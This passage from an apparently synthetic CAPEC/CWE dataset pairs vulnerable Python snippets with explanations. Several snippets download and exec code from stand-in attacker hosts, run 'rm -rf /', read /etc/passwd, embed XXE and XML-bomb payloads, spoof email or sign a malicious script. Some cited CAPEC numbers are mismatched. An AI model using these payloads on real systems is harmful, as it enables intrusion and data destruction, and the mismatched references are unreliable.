        "code_snippet": "import smtplib\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/send_email', methods=['POST'])\ndef send_email():\n    recipient = request.form['recipient']\n    subject = request.form['subject']\n    body = request.form['body']\n\n    # Vulnerable code: directly using user input in SMTP commands\n    smtp_command = f\"MAIL FROM:<{recipient}>\\r\\nRCPT TO:<{recipient}>\\r\\nDATA\\r\\nSubject: {subject}\\r\\n{body}\\r\\n.\\r\\n\"\n\n    try:\n        server = smtplib.SMTP('localhost')\n        server.sendmail('webmail@example.com', [recipient], smtp_command)\n        server.quit()\n        return 'Email sent successfully'\n    except Exception as e:\n        return str(e)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web-mail server endpoint that allows users to send emails. The Flask application receives user input for the recipient, subject, and body of the email via a POST request. The user input is then directly embedded into an SMTP command without proper sanitization or validation, leading to potential IMAP/SMTP command injection vulnerabilities (CWE-77). Additionally, the code may expose sensitive information through error messages (CWE-209) and relies on client-side input for server-side security (CWE-602). This example highlights the importance of proper input validation and sanitization to prevent command injection attacks."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# Execute the downloaded code without verifying its integrity\nexec(response.text)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = 'Sensitive System Information'\nprint(sensitive_info)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code embedded within the script\nmalicious_function = lambda: exec('import os; os.system(\"rm -rf /\")')\nmalicious_function()",
        "description": "This Python code snippet demonstrates a 'Software Integrity Attack' by combining several related CWEs. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494). It then exposes sensitive system information by printing it to the console (CWE-497). Additionally, it contains embedded malicious code that, when executed, performs a destructive action (CWE-506). This snippet highlights how an attacker can undermine software integrity by exploiting these weaknesses."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-509: Replicating Malicious Code (Virus or Worm)\nexec(response.text)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport os\nsensitive_info = os.popen('cat /etc/passwd').read()\nprint(sensitive_info)",
        "description": "This Python code snippet demonstrates a scenario where a script downloads and executes code from a remote source without verifying its integrity (CWE-494). The downloaded code could contain embedded malicious code (CWE-506), act as a Trojan horse (CWE-507), or replicate itself (CWE-509). Additionally, the script exposes sensitive system information (CWE-497) by reading and printing the contents of the '/etc/passwd' file. This example embodies the main idea of CAPEC-160, where an attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code from an attacker-controlled source."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import requests\n\n# URL of the update (controlled by an adversary)\nupdate_url = 'http://malicious.example.com/update'\n\n# Download the update without integrity check\nresponse = requests.get(update_url)\n\n# Execute the downloaded code\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a vulnerable software update mechanism. It downloads an update from a URL controlled by an adversary without performing any integrity checks to verify the origin or authenticity of the code. The downloaded code is then executed directly, which could lead to the execution of malicious code. This example embodies the main idea of the CAPEC 'Malicious Software Update' and highlights the CWE-494 'Download of Code Without Integrity Check'."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\n\n# URL of the update server\nupdate_url = 'http://malicious-server.com/update'\n\n# Function to download and execute update\ndef download_and_execute_update(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            # Directly execute the downloaded code without integrity check\n            exec(response.text)\n        else:\n            print('Failed to download update')\n    except Exception as e:\n        print(f'Error during update: {e}')\n\n# Simulate an update process\nif __name__ == '__main__':\n    download_and_execute_update(update_url)",
        "description": "This Python code snippet demonstrates a vulnerable automated software update mechanism. The code downloads an update from a specified URL and executes it without performing any integrity checks or proper authentication of the server. This embodies the main idea of the CAPEC 'Malicious Automated Software Update via Redirection' by showing how an attacker can exploit the lack of integrity checks (CWE-494) and authentication mechanisms (CWE-294) to inject malicious code. The code also highlights the reliance on untrusted inputs (CWE-807) and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import base64\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# Using Base64 for encoding sensitive data (not secure for cryptographic purposes)\ndef encode_sensitive_data(data):\n    return base64.b64encode(data.encode('utf-8')).decode('utf-8')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Exposing sensitive system information\nsensitive_info = 'System Secret Key: 12345'\nencoded_info = encode_sensitive_data(sensitive_info)\nprint(f'Encoded Sensitive Info: {encoded_info}')\n\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n# Undocumented feature: hidden debug mode\nDEBUG_MODE = True\nif DEBUG_MODE:\n    print('Debug mode is enabled. Sensitive operations can be performed.')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Security-critical code that might be optimized away\nsecurity_check = True\nif security_check:\n    print('Security check passed.')\nelse:\n    print('Security check failed.')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to reverse engineering and the associated CWEs. The `encode_sensitive_data` function uses Base64 encoding, which is not secure for cryptographic purposes (CWE-327). The `sensitive_info` variable contains sensitive system information that is exposed (CWE-497). The `DEBUG_MODE` variable represents an undocumented feature that can enable hidden debug functionality (CWE-1242). Finally, the `security_check` variable represents a security-critical check that could be optimized away by the processor (CWE-1037). This code embodies the main idea of reverse engineering by showcasing how an adversary could exploit these weaknesses to understand and potentially manipulate the system."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import time\nimport random\n\nclass SecureDevice:\n    def __init__(self, secret):\n        self.secret = secret\n\n    def authenticate(self, token):\n        # Simulate power consumption delay\n        for i in range(len(token)):\n            if i < len(self.secret) and token[i] == self.secret[i]:\n                time.sleep(0.1)  # Simulate processing time\n            else:\n                time.sleep(0.05)  # Different processing time for incorrect token\n        return token == self.secret\n\n# Example usage\nsecret = 's3cr3t'\ndevice = SecureDevice(secret)\n\n# Adversary attempts to reverse engineer the secret\nattempts = ['s3cr3t', 's3cret', 's3cr3t1', 's3cr3']\nfor attempt in attempts:\n    start_time = time.time()\n    result = device.authenticate(attempt)\n    end_time = time.time()\n    print(f'Attempt: {attempt}, Success: {result}, Time taken: {end_time - start_time:.2f} seconds')",
        "description": "This Python code snippet simulates a secure device that authenticates a token against a secret. The authentication process introduces different delays based on whether the token characters match the secret, which can be exploited through timing attacks. This embodies the concept of Black Box Reverse Engineering (CAPEC) by allowing an adversary to infer the secret through observable discrepancies in response times (CWE-203). The code also hints at vulnerabilities related to power side-channel attacks (CWE-1255) and improper protection of physical side channels (CWE-1300) by simulating different processing times. The example usage demonstrates how an adversary might attempt to reverse engineer the secret by measuring the time taken for each authentication attempt."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import os\nimport requests\n\n# Hidden functionality: This function is not documented or intended for regular users\n# CWE-912: Hidden Functionality\n# CWE-506: Embedded Malicious Code\n# CWE-494: Download of Code Without Integrity Check\ndef hidden_functionality():\n    url = 'http://malicious.example.com/malicious_code.py'\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)  # Execute downloaded code without integrity check\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef expose_sensitive_info():\n    sensitive_info = os.popen('uname -a').read()  # Collect system information\n    print(sensitive_info)  # Expose sensitive system information\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ndef improper_trace_management():\n    trace_data = 'Sensitive trace data'\n    with open('/tmp/trace.log', 'w') as f:\n        f.write(trace_data)  # Store trace data in an unprotected location\n\n# Main function to demonstrate the vulnerabilities\ndef main():\n    hidden_functionality()\n    expose_sensitive_info()\n    improper_trace_management()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Reverse Engineer an Executable to Expose Assumed Hidden Functionality' and associated CWEs. The 'hidden_functionality' function represents hidden and potentially malicious code that downloads and executes code from a remote location without verifying its integrity (CWE-912, CWE-506, CWE-494). The 'expose_sensitive_info' function exposes sensitive system information to unauthorized users (CWE-497). The 'improper_trace_management' function improperly manages sensitive trace data by storing it in an unprotected location (CWE-1323). This code highlights how hidden and undocumented functionalities can be exploited to compromise system security."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "import hashlib\n\n# Hard-coded sensitive constants\nSECRET_KEY = 'my_secret_key'\nPASSWORD = 'password123'\n\n# Function that uses the hard-coded credentials\ndef authenticate(user_input):\n    if user_input == PASSWORD:\n        return 'Authenticated'\n    else:\n        return 'Access Denied'\n\n# Function that uses the hard-coded secret key\ndef hash_data(data):\n    return hashlib.sha256((data + SECRET_KEY).encode()).hexdigest()\n\n# Example usage\nuser_input = 'password123'\nprint(authenticate(user_input))\nprint(hash_data('sensitive_data'))",
        "description": "This Python code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive constants such as a password and a secret key. The 'authenticate' function uses a hard-coded password for user authentication, and the 'hash_data' function uses a hard-coded secret key to hash data. This code is vulnerable to attacks because an adversary can discover these sensitive constants through static or dynamic analysis of the executable, leading to potential security breaches. The code embodies CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants), and CWE-318 (Cleartext Storage of Sensitive Information in Executable)."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import socket\nimport ssl\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but use a weak cipher\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS)\ncontext.set_ciphers('DES-CBC3-SHA')  # Weak cipher\n\n# Connect to the server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send sensitive data in cleartext\nwrapped_socket.send(b'username=admin&password=admin')\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a network communication protocol. It creates a socket and wraps it with SSL using a weak cipher (DES-CBC3-SHA), which embodies CWE-326 (Inadequate Encryption Strength). The code then sends sensitive information (username and password) in cleartext, representing CWE-319 (Cleartext Transmission of Sensitive Information). This example highlights the risks associated with weak encryption and cleartext transmission, which can be exploited by an adversary performing protocol analysis to decipher and decode the transmitted information."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import requests\n\ndef include_remote_file(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            exec(response.text)\n        else:\n            print('Failed to retrieve the file')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\ninclude_remote_file('http://example.com/malicious_code.py')",
        "description": "This Python code snippet demonstrates a remote file inclusion vulnerability. The function `include_remote_file` takes a URL as input, retrieves the content of the file at that URL using the `requests` library, and then executes the content using the `exec` function. This is analogous to the PHP Remote File Inclusion (RFI) vulnerability described in the CAPEC. The code does not perform any validation or sanitization of the input URL, making it susceptible to exploitation. An attacker could supply a URL pointing to a malicious script, which would then be executed by the application, potentially compromising the system. This example also touches on CWE-98 (Improper Control of Filename for Include/Require Statement), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and CWE-553 (Command Shell in Externally Accessible Directory) by demonstrating how unvalidated external input can lead to dangerous behavior."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable email sending function\n\ndef send_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address  # This can be easily spoofed\n    msg['To'] = to_address\n\n    # Connect to the SMTP server\n    with smtplib.SMTP('localhost') as server:\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click the link below to update your account.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that embodies the 'Fake the Source of Data' CAPEC. The function `send_email` allows an attacker to spoof the 'From' address, making it appear as though the email is coming from a trusted source. This is due to improper authentication (CWE-287) and improper verification of the source of a communication channel (CWE-940). The SMTP server does not verify the authenticity of the 'From' address, leading to potential phishing attacks or other malicious activities. This example highlights the importance of proper authentication and verification mechanisms to prevent such vulnerabilities."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-1390: Weak Authentication\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Function to send a spoofed email\ndef send_spoofed_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # Here, we are not verifying the destination address properly\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nsend_spoofed_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click the link to update your account.')",
        "description": "This Python code snippet demonstrates a Principal Spoof attack by sending a spoofed email. The function `send_spoofed_email` constructs an email message that appears to come from a legitimate source (spoofed@example.com) and sends it to the victim (victim@example.com). The code leverages CWE-290 (Authentication Bypass by Spoofing) by not verifying the sender's identity, CWE-1390 (Weak Authentication) by using a weak authentication mechanism, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not properly verifying the destination address. This example illustrates how an attacker can craft a message that appears to come from a trusted source to deceive the recipient."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import hashlib\nimport time\nimport random\n\n# Weak session ID generation using predictable values\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def generate_session_id(self, user_id):\n        # Using user_id and current time to generate session ID\n        # This is predictable and can be forged\n        session_id = hashlib.md5(f'{user_id}{time.time()}'.encode()).hexdigest()\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def validate_session(self, session_id):\n        return session_id in self.sessions\n\n# Simulating user login\nuser_id = 'user123'\nsession_manager = SessionManager()\nsession_id = session_manager.generate_session_id(user_id)\nprint(f'Generated session ID: {session_id}')\n\n# Attacker forges a session ID\nforged_session_id = hashlib.md5(f'{user_id}{time.time() - random.randint(1, 1000)}'.encode()).hexdigest()\nprint(f'Forged session ID: {forged_session_id}')\n\n# Validate forged session ID\nif session_manager.validate_session(forged_session_id):\n    print('Forged session ID is valid!')\nelse:\n    print('Forged session ID is invalid!')",
        "description": "This Python code snippet demonstrates a vulnerable session management system where session IDs are generated using predictable values (user ID and current time). The `generate_session_id` method creates a session ID by hashing the user ID and the current time, which can be easily predicted and forged by an attacker. The attacker can generate a forged session ID by using a similar hashing method with a slightly different timestamp. The `validate_session` method checks if a session ID exists in the session store, but it cannot distinguish between a legitimate and a forged session ID. This code embodies the main idea of CAPEC-384 (Session Credential Falsification through Forging) and highlights related weaknesses such as CWE-384 (Session Fixation), CWE-664 (Improper Control of a Resource Through its Lifetime), and CWE-1391 (Use of Weak Credentials)."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Define a recursive XML entity expansion\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY a \"a\">\n<!ENTITY b \"&a;&a;\">\n<!ENTITY c \"&b;&b;\">\n<!ENTITY d \"&c;&c;\">\n<!ENTITY e \"&d;&d;\">\n<!ENTITY f \"&e;&e;\">\n<!ENTITY g \"&f;&f;\">\n<!ENTITY h \"&g;&g;\">\n<!ENTITY i \"&h;&h;\">\n<!ENTITY j \"&i;&i;\">\n<!ENTITY k \"&j;&j;\">\n<!ENTITY l \"&k;&k;\">\n<!ENTITY m \"&l;&l;\">\n<!ENTITY n \"&m;&m;\">\n<!ENTITY o \"&n;&n;\">\n<!ENTITY p \"&o;&o;\">\n<!ENTITY q \"&p;&p;\">\n<!ENTITY r \"&q;&q;\">\n<!ENTITY s \"&r;&r;\">\n<!ENTITY t \"&s;&s;\">\n<!ENTITY u \"&t;&t;\">\n<!ENTITY v \"&u;&u;\">\n<!ENTITY w \"&v;&v;\">\n<!ENTITY x \"&w;&w;\">\n<!ENTITY y \"&x;&x;\">\n<!ENTITY z \"&y;&y;\">\n]>\n<root>&z;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\nexcept ET.ParseError as e:\n    print(f\"Parse error: {e}\")\nexcept MemoryError as e:\n    print(f\"Memory error: {e}\")\n",
        "description": "This Python code snippet demonstrates an Exponential Data Expansion attack using XML Entity Expansion (CWE-776). The XML data contains nested entity definitions that expand exponentially, leading to excessive memory and CPU usage when parsed. The code attempts to parse this XML data using the xml.etree.ElementTree module, which can result in a memory error or parse error due to the excessive resource demands. This example highlights the vulnerability of applications that do not properly limit or throttle resource allocation (CWE-770) and the risks associated with complex data representations (CWE-1093)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/error')\ndef error_page():\n    error_message = request.args.get('error_message', 'An error occurred')\n    # Vulnerable to XSS\n    return render_template_string(f'<html><body><h1>Error</h1><p>{error_message}</p></body></html>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with an endpoint '/error' that displays an error message. The error message is taken from a query parameter 'error_message' without proper sanitization, making it vulnerable to Cross-Site Scripting (XSS) attacks. An attacker can craft a URL with a malicious script in the 'error_message' parameter, which will be executed when the error page is rendered. This demonstrates the CAPEC concept of 'XSS Targeting Error Pages' and highlights related CWEs such as 'Improper Neutralization of Script in an Error Message Web Page' (CWE-81) and 'Improper Neutralization of Input During Web Page Generation' (CWE-79)."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Incomplete denylist to filter out script tags\n    denylist = ['<script>', '</script>']\n    for item in denylist:\n        query = query.replace(item, '')\n    # Render the query directly in the template\n    return render_template_string('<p>Search results for: {{ query }}</p>', query=query)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a search endpoint that takes a query parameter from the user. It attempts to filter out script tags using an incomplete denylist, which only includes '<script>' and '</script>'. This approach is flawed because it does not account for alternate syntax forms of the script tag, such as 'ScRiPt' or other variations. The query is then directly rendered in the HTML template without proper sanitization, making the application susceptible to XSS attacks. This code embodies the main idea of CAPEC-147: 'XSS Using Alternate Syntax', and highlights related weaknesses such as CWE-87, CWE-80, CWE-692, and CWE-1336."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import re\n\ndef process_input(user_input):\n    # Input filter removed\n    # if not re.match(r'^[a-zA-Z0-9_]+$', user_input):\n    #     raise ValueError('Invalid input')\n    return user_input\n\n\ndef execute_command(command):\n    # Output filter removed\n    # command = re.sub(r'[;&|]', '', command)\n    print(f'Executing: {command}')\n\n# Example usage\nuser_input = \"; rm -rf /\"\ncommand = f'echo {process_input(user_input)}'\nexecute_command(command)",
        "description": "This Python code snippet demonstrates the removal of input and output filters, which is the main idea of the CAPEC. The `process_input` function is supposed to validate the user input to ensure it only contains alphanumeric characters and underscores, but the validation code is commented out, effectively removing the input filter. Similarly, the `execute_command` function is supposed to sanitize the command to remove dangerous characters like `;`, `&`, and `|`, but this sanitization is also commented out, removing the output filter. This makes the application vulnerable to injection attacks, as shown in the example usage where a malicious input `; rm -rf /` is passed through and executed without any filtering."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that parses XML data\n# CWE-611: Improper Restriction of XML External Entity Reference\n# CWE-502: Deserialization of Untrusted Data\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        return root\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Example of serialized XML data with an external entity reference\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n    <data>&ext;</data>\n</root>\n'''\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-499: Serializable Class Containing Sensitive Data\n# CWE-1070: Serializable Data Element Containing non-Serializable Item Elements\nresult = parse_xml(xml_data)\nif result is not None:\n    print(ET.tostring(result, encoding='unicode'))",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The `parse_xml` function uses the `xml.etree.ElementTree` module to parse XML data. The provided XML data contains an external entity reference (`&ext;`) that points to a local file (`/etc/passwd`). This can lead to an XML External Entity (XXE) attack (CWE-611), where an attacker can access sensitive files on the system. The code also highlights issues related to deserialization of untrusted data (CWE-502), inclusion of functionality from an untrusted control sphere (CWE-829), and handling of serializable data elements containing non-serializable items (CWE-1070). The example demonstrates how an attacker can exploit these weaknesses to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import requests\n\nclass MaliciousClient:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def bypass_authentication(self):\n        # Bypassing client-side authentication\n        response = requests.get(self.target_url, headers={'Authorization': 'Bearer fake_token'})\n        return response.text\n\n    def inject_malicious_code(self):\n        # Injecting malicious code\n        payload = {'data': '<script>alert(\"Malicious Code Executed\")</script>'}\n        response = requests.post(self.target_url, data=payload)\n        return response.status_code\n\n    def create_emergent_resource(self):\n        # Creating an unintended resource\n        response = requests.post(self.target_url + '/create', data={'resource': 'new_resource'})\n        return response.status_code\n\n# Example usage\nclient = MaliciousClient('http://example.com/api')\nprint(client.bypass_authentication())\nprint(client.inject_malicious_code())\nprint(client.create_emergent_resource())",
        "description": "This Python code snippet demonstrates a malicious client that interacts with a target service, violating the assumptions the service makes about its clients. The `MaliciousClient` class includes methods to bypass client-side authentication (CWE-603), inject malicious code (CWE-506), and create unintended resources (CWE-1229). The `bypass_authentication` method sends a request with a fake token to bypass authentication checks. The `inject_malicious_code` method sends a payload containing a script to the target service, demonstrating the injection of malicious code. The `create_emergent_resource` method creates a new resource on the server, which may be unintended and violate the service's policy. This code embodies the main idea of the CAPEC 'Create Malicious Client' by showing how a client can be crafted to exploit server-side assumptions and vulnerabilities."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\ndef manipulate_registry(key_path, value_name, new_value):\n    try:\n        # Open the registry key\n        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)\n        # Modify the registry value\n        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, new_value)\n        winreg.CloseKey(registry_key)\n        print(f'Successfully modified {value_name} to {new_value}')\n    except Exception as e:\n        print(f'Failed to modify registry: {e}')\n\n# Example usage\nmanipulate_registry(r'Software\\ExampleApp', 'ConfigValue', 'NewConfig')",
        "description": "This Python code snippet demonstrates how to manipulate Windows Registry information, which aligns with the CAPEC description of 'Manipulate Registry Information'. The function `manipulate_registry` takes a registry key path, a value name, and a new value as arguments. It opens the specified registry key, modifies the value, and then closes the key. This action can be used to alter application configurations or hide indicators of compromise. The code also highlights CWE-15 (External Control of System or Configuration Setting) by allowing external input to control registry settings, and CWE-314 (Cleartext Storage in the Registry) by potentially storing sensitive information in cleartext within the registry."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import requests\n\n# Function to fetch sensitive data from a remote server\ndef fetch_sensitive_data(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Store the sensitive data in a cache (insecurely)\n        cache = response.text\n        return cache\n    else:\n        return None\n\n# URL containing sensitive information\nsensitive_url = 'https://example.com/sensitive-data'\n\n# Fetch and cache the sensitive data\ncached_data = fetch_sensitive_data(sensitive_url)\n\n# Print the cached data (for demonstration purposes)\nprint(cached_data)",
        "description": "This Python code snippet demonstrates a scenario where sensitive data is fetched from a remote server and stored in a cache without any protection. The `fetch_sensitive_data` function retrieves data from a given URL and stores it in a variable named `cache`. This cache is then printed out, representing a potential vulnerability where sensitive information is stored insecurely and can be accessed by an attacker. This example embodies the CAPEC 'Lifting Sensitive Data Embedded in Cache' and highlights related CWEs such as 'Use of Cache Containing Sensitive Information' and 'Missing Encryption of Sensitive Data'."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "import base64\n\n# Simulate storing sensitive data in client-side code\nembedded_key = 'c2VjcmV0X2tleQ=='  # Base64 encoded 'secret_key'\n\n# Function to retrieve the embedded key\n\ndef get_embedded_key():\n    return base64.b64decode(embedded_key).decode('utf-8')\n\n# Simulate using the embedded key for authentication\n\ndef authenticate_client():\n    key = get_embedded_key()\n    if key == 'secret_key':\n        print('Authentication successful')\n    else:\n        print('Authentication failed')\n\n# Main function to simulate client-side authentication\n\ndef main():\n    authenticate_client()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerable practice of embedding sensitive data (a secret key) directly in the client-side code. The key is base64 encoded and stored in a variable, which can be easily decoded to retrieve the original key. The `authenticate_client` function uses this key for authentication, representing a scenario where client-side authentication is performed without server-side verification. This is a security risk as an attacker can extract the key from the client code and bypass authentication, aligning with the issues described in CAPEC-37 and related CWEs such as CWE-522 (Insufficiently Protected Credentials) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nSIGNING_KEY = 'hardcoded_signing_key.pem'\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod(SIGNING_KEY, 0o777)  # Insecurely setting permissions to allow read/write by anyone\n\n# CWE-494: Download of Code Without Integrity Check\nmalicious_code_url = 'http://malicious.example.com/malicious_code.py'\nsubprocess.run(['wget', malicious_code_url, '-O', 'malicious_code.py'])\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_code.py', 'a') as f:\n    f.write('\\n# Malicious payload\\n')\n    f.write('os.system(\"rm -rf /important_data\")')\n\n# Signing the malicious code\nsubprocess.run(['openssl', 'dgst', '-sha256', '-sign', SIGNING_KEY, '-out', 'malicious_code.sig', 'malicious_code.py'])\n\nprint('Malicious code signed and ready for distribution.')",
        "description": "This Python code snippet demonstrates a scenario where an adversary uses a hard-coded signing key (CWE-798) to sign malicious code. The key is insecurely stored and its permissions are set to allow anyone to read or modify it (CWE-732). The code downloads a malicious script from a remote location without verifying its integrity (CWE-494) and appends additional malicious payload to it (CWE-506). Finally, the script signs the malicious code using the hard-coded key, making it appear legitimate to users or systems that verify the signature. This embodies the main idea of the CAPEC 'Signing Malicious Code', where an adversary uses extracted credentials to sign and distribute malicious content."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import requests\n\n# Function to download and execute code from a remote server\ndef download_and_execute(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# Client-side authentication (vulnerable)\ndef client_side_authentication(user_input):\n    if user_input == 'trusted_user':\n        print('Authentication successful')\n        download_and_execute('http://example.com/malicious_code.py')\n    else:\n        print('Authentication failed')\n\n# Simulate user input\nuser_input = 'trusted_user'\nclient_side_authentication(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of client-side functionality and security enforcement. The `client_side_authentication` function performs authentication on the client side, which can be easily bypassed by modifying the client. Upon successful authentication, it downloads and executes code from a remote server without performing any integrity checks. This embodies the CAPEC of 'Removing Important Client Functionality' by showing how an adversary can disable or bypass client-side security mechanisms, leading to potential exploitation. The related CWEs are represented as follows: CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-603 (Use of Client-Side Authentication), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "import requests\n\n# Price per item set by the server\nprice_per_item = 100\n\n# Client-side calculation of total cost\n# Vulnerable to manipulation\nquantity = int(input('Enter quantity: '))\ntotal_cost = price_per_item * quantity\n\n# Attacker can manipulate the total_cost before sending to the server\n# For example, setting total_cost to a lower value\n# total_cost = 10  # Malicious manipulation\n\n# Sending the manipulated total cost to the server\nresponse = requests.post('http://example.com/purchase', data={'total_cost': total_cost})\n\nprint('Server response:', response.text)",
